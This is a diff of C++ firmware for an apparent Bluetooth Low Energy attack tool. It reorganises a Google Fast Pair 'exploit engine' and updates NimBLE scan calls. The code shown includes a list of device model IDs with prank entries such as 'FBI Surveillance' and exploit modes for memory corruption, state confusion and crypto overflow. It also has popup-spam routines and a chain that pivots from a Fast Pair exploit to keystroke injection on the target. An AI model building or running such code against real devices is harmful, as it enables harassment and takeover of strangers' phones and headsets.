@@ -194,7 +194,6 @@ DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
     return profile;
 }
 
-// FastPair Device Models Database
 struct FastPairModel {
     uint32_t modelId;
     const char* name;
@@ -204,7 +203,6 @@ struct FastPairModel {
     uint16_t bleAdvDataLen;
 };
 
-// FastPair Popup Categories
 enum FastPairPopupType {
     FP_POPUP_REGULAR = 0,
     FP_POPUP_FUN,
@@ -212,7 +210,6 @@ enum FastPairPopupType {
     FP_POPUP_CUSTOM
 };
 
-// FastPair Exploit Types
 enum FastPairExploitType {
     FP_EXPLOIT_MEMORY_CORRUPTION = 0,
     FP_EXPLOIT_STATE_CONFUSION,
@@ -222,9 +219,7 @@ enum FastPairExploitType {
     FP_EXPLOIT_ALL
 };
 
-// Major FastPair device models
 static const FastPairModel fastpair_models[] = {
-    // Samsung
     {0x000047, "Galaxy Buds", "Samsung", "Earbuds"},
     {0x000048, "Galaxy Buds+", "Samsung", "Earbuds"},
     {0x000049, "Galaxy Buds Live", "Samsung", "Earbuds"},
@@ -232,27 +227,17 @@ static const FastPairModel fastpair_models[] = {
     {0x00000B, "Galaxy Buds2", "Samsung", "Earbuds"},
     {0x00000D, "Galaxy Buds2 Pro", "Samsung", "Earbuds"},
     {0x00000F, "Galaxy Buds FE", "Samsung", "Earbuds"},
-    
-    // Pixel
     {0x0000F0, "Pixel Buds", "Google", "Earbuds"},
     {0x0002F0, "Pixel Buds A-Series", "Google", "Earbuds"},
     {0x000006, "Pixel Buds Pro", "Google", "Earbuds"},
-    
-    // JBL
     {0x0C0B67, "JBL Live 300TWS", "JBL", "Earbuds"},
     {0x0DBBDB, "JBL Tune 230NC", "JBL", "Earbuds"},
     {0x0DC6BF, "JBL Reflect Flow", "JBL", "Earbuds"},
     {0x0DF297, "JBL Live 660NC", "JBL", "Headphones"},
-    
-    // Sony
     {0x0D1EF6, "WH-1000XM4", "Sony", "Headphones"},
     {0x0D3601, "WF-1000XM4", "Sony", "Earbuds"},
-    
-    // Bose
     {0x00AA91, "QuietComfort 35 II", "Bose", "Headphones"},
     {0x00C95C, "QuietComfort Earbuds", "Bose", "Earbuds"},
-    
-    // Fun Popups (Prank Models)
     {0xF00100, "Tesla Model S", "Tesla", "Vehicle"},
     {0xF00101, "Tesla Model 3", "Tesla", "Vehicle"},
     {0xF00103, "Tesla Model X", "Tesla", "Vehicle"},
@@ -261,15 +246,9 @@ static const FastPairModel fastpair_models[] = {
     {0xF00106, "Tesla Roadster", "Tesla", "Vehicle"},
     {0xF01011, "FBI Surveillance", "FBI", "Government"},
     {0xF38C02, "Obama's Earpiece", "White House", "Government"},
-    
-    // LG
     {0x000035, "LG Tone Free", "LG", "Earbuds"},
-    
-    // Microsoft
     {0xF00000, "Surface Headphones", "Microsoft", "Headphones"},
     {0xF00001, "Surface Earbuds", "Microsoft", "Earbuds"},
-    
-    // Other Brands
     {0x000008, "OnePlus Buds", "OnePlus", "Earbuds"},
     {0x000009, "OnePlus Buds Pro", "OnePlus", "Earbuds"},
     {0x00000C, "OnePlus Buds Z", "OnePlus", "Earbuds"},
@@ -277,13 +256,9 @@ static const FastPairModel fastpair_models[] = {
     {0x000011, "Xiaomi Buds", "Xiaomi", "Earbuds"},
     {0x000012, "Oppo Enco", "Oppo", "Earbuds"},
     {0x000013, "Vivo TWS", "Vivo", "Earbuds"},
-    
-    // More for testing
     {0x5CC900, "Generic Test Device", "TestCorp", "Test"},
     {0x5CC901, "Debug Device 1", "DebugInc", "Test"},
     {0x5CC902, "Debug Device 2", "DebugInc", "Test"},
-    
-    // End marker
     {0x000000, nullptr, nullptr, nullptr, {}, 0}
 };
 
@@ -304,7 +279,6 @@ private:
 public:
     FastPairExploitEngine() {}
     
-    // Scan for FastPair devices
     std::vector<FastPairDeviceInfo> scanForFastPairDevices(int duration = 10) {
         discoveredDevices.clear();
         
@@ -323,7 +297,8 @@ public:
         pScan->setWindow(67);
         
 #ifdef NIMBLE_V2_PLUS
-        NimBLEScanResults results = pScan->getResults(duration * 1000, false);
+        pScan->start(duration, false);
+        NimBLEScanResults results = pScan->getResults();
 #else
         NimBLEScanResults results = pScan->start(duration, false);
 #endif
@@ -376,7 +351,6 @@ public:
         return discoveredDevices;
     }
     
-    // Exploit FastPair connection
     bool exploitFastPairConnection(NimBLEAddress target, FastPairExploitType exploitType = FP_EXPLOIT_ALL) {
         AutoCleanup cleanup([]() {
             BLEStateManager::deinitBLE(true);
@@ -448,7 +422,6 @@ public:
         return exploitSuccess;
     }
     
-    // Spam FastPair notifications
     void spamFastPairPopups(FastPairPopupType popupType = FP_POPUP_REGULAR, int count = 50) {
         AutoCleanup cleanup([]() {
             BLEStateManager::deinitBLE(true);
@@ -488,7 +461,6 @@ public:
         showAttackProgress("Popup spam completed", TFT_GREEN);
     }
     
-    // Test FastPair vulnerability
     bool testVulnerability(NimBLEAddress target) {
         showAttackProgress("Testing FastPair vulnerability...", TFT_CYAN);
         
@@ -801,6 +773,75 @@ private:
         mac[0] = (mac[0] & 0xFE) | 0x02;
     }
 };
+
+void runFastPairScan(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    auto devices = fpEngine.scanForFastPairDevices(15);
+    
+    std::vector<String> lines;
+    lines.push_back("FASTPAIR DEVICE SCAN");
+    lines.push_back("Found: " + String(devices.size()) + " devices");
+    lines.push_back("");
+    
+    for(int i = 0; i < std::min(6, (int)devices.size()); i++) {
+        String deviceInfo = devices[i].name + " (" + devices[i].deviceType + ")";
+        if(deviceInfo.length() > 30) deviceInfo = deviceInfo.substring(0, 27) + "...";
+        lines.push_back(deviceInfo);
+    }
+    
+    if(devices.size() > 6) {
+        lines.push_back("... and " + String(devices.size() - 6) + " more");
+    }
+    
+    showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
+}
+
+void runFastPairVulnerabilityTest(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.testVulnerability(target);
+}
+
+void runFastPairMemoryCorruption(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_MEMORY_CORRUPTION);
+}
+
+void runFastPairStateConfusion(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION);
+}
+
+void runFastPairCryptoOverflow(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_CRYPTO_OVERFLOW);
+}
+
+void runFastPairPopupSpam(NimBLEAddress target, FastPairPopupType type) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.spamFastPairPopups(type, 100);
+}
+
+void runFastPairAllExploits(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_ALL);
+}
+
+void runFastPairHIDChain(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    
+    if(fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION)) {
+        showAttackProgress("FastPair successful! Pivoting to HID...", TFT_GREEN);
+        
+        HIDAttackServiceClass hidAttack;
+        if(hidAttack.injectKeystrokes(target)) {
+            showAttackResult(true, "FastPair → HID chain successful!");
+        } else {
+            showAttackResult(false, "FastPair worked but HID failed");
+        }
+    } else {
+        showAttackResult(false, "FastPair exploit failed");
+    }
+}
 
 NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& connectionMethod) {
     NimBLEClient* pClient = nullptr;
@@ -5042,75 +5083,6 @@ void runHFPHIDPivotAttack(NimBLEAddress target) {
     }
 }
 
-void runFastPairScan(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    auto devices = fpEngine.scanForFastPairDevices(15);
-    
-    std::vector<String> lines;
-    lines.push_back("FASTPAIR DEVICE SCAN");
-    lines.push_back("Found: " + String(devices.size()) + " devices");
-    lines.push_back("");
-    
-    for(int i = 0; i < std::min(6, (int)devices.size()); i++) {
-        String deviceInfo = devices[i].name + " (" + devices[i].deviceType + ")";
-        if(deviceInfo.length() > 30) deviceInfo = deviceInfo.substring(0, 27) + "...";
-        lines.push_back(deviceInfo);
-    }
-    
-    if(devices.size() > 6) {
-        lines.push_back("... and " + String(devices.size() - 6) + " more");
-    }
-    
-    showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
-}
-
-void runFastPairVulnerabilityTest(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    fpEngine.testVulnerability(target);
-}
-
-void runFastPairMemoryCorruption(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_MEMORY_CORRUPTION);
-}
-
-void runFastPairStateConfusion(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION);
-}
-
-void runFastPairCryptoOverflow(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_CRYPTO_OVERFLOW);
-}
-
-void runFastPairPopupSpam(NimBLEAddress target, FastPairPopupType type) {
-    FastPairExploitEngine fpEngine;
-    fpEngine.spamFastPairPopups(type, 100);
-}
-
-void runFastPairAllExploits(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_ALL);
-}
-
-void runFastPairHIDChain(NimBLEAddress target) {
-    FastPairExploitEngine fpEngine;
-    
-    if(fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION)) {
-        showAttackProgress("FastPair successful! Pivoting to HID...", TFT_GREEN);
-        
-        HIDAttackServiceClass hidAttack;
-        if(hidAttack.injectKeystrokes(target)) {
-            showAttackResult(true, "FastPair → HID chain successful!");
-        } else {
-            showAttackResult(false, "FastPair worked but HID failed");
-        }
-    } else {
-        showAttackResult(false, "FastPair exploit failed");
-    }
-}
-
 void runMultiTargetAttack() {
     std::vector<NimBLEAddress> targets;
     String selected = selectMultipleTargetsFromScan("SELECT TARGETS", targets);
@@ -5296,7 +5268,8 @@ String selectTargetFromScan(const char* title) {
 #endif
 
 #ifdef NIMBLE_V2_PLUS
-    NimBLEScanResults results = pBLEScan->getResults(ACTIVE_SCAN_TIME*1000, false);
+    pBLEScan->start(ACTIVE_SCAN_TIME, false);
+    NimBLEScanResults results = pBLEScan->getResults();
 #else
     NimBLEScanResults results = pBLEScan->start(ACTIVE_SCAN_TIME, false);
 #endif
@@ -5306,7 +5279,8 @@ String selectTargetFromScan(const char* title) {
     pBLEScan->setActiveScan(false);
 
 #ifdef NIMBLE_V2_PLUS
-    results = pBLEScan->getResults(PASSIVE_SCAN_TIME*1000, false);
+    pBLEScan->start(PASSIVE_SCAN_TIME, false);
+    results = pBLEScan->getResults();
 #else
     results = pBLEScan->start(PASSIVE_SCAN_TIME, false);
 #endif
